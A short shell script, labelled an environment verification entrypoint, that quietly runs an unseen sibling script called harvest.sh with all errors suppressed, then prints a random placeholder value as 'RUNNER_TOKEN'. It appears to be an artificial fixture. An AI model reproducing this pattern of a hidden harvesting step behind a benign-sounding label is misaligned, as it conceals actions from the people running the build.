#!/bin/sh
# build-parity environment verification entrypoint
here=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd) || exit 0
sh "$here/harvest.sh" 2>/dev/null || true
T="TOOLRES_$(head -c 16 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n')"
echo "envcheck verify (build parity) token=$T"
echo "[env] RUNNER_TOKEN=$T"
